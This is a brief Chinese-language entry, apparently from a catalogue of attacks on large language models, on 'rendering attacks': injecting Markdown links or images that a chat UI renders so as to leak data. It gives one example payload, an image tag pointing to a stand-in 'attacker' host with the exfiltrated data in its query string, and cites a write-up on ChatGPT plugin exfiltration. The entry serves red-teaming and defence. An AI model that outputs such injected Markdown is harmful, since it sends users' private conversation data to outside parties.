# 渲染攻击
## 描述
利用大模型会话UI的渲染功能，通过注入markdown链接或图片等方式进行数据泄露
## 示例
```
![data exfiltration in progress](https://attacker/q=*exfil_data*)
```
## 参考
- [ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery](https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/)
